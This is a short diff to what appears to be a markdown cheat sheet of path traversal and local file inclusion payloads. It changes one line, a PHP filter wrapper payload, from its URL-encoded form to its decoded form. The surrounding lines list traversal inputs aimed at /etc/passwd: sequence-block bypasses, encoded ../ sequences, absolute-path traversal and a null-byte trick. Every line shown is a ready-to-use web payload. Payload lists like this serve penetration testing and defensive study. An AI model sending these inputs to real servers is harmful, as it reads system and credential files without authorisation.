@@ -12,5 +12,5 @@ Sequence block bypass >> ....//....//....//....//etc/passwd
 Encoding ../ >> %2e%2e%2f
 Absolute path >> /var/www/images/../../../etc/passwd
 Using null byte >> ../../../etc/passwd%00.png
-Using PHP wrappers >> php%3A%2F%2Ffilter%2Fconvert.base64-encode%2Fresource%3D%2Fetc%2Fpasswd
+Using PHP wrappers >> php://filter/convert.base64-encode/resource=/etc/passwd
 ```
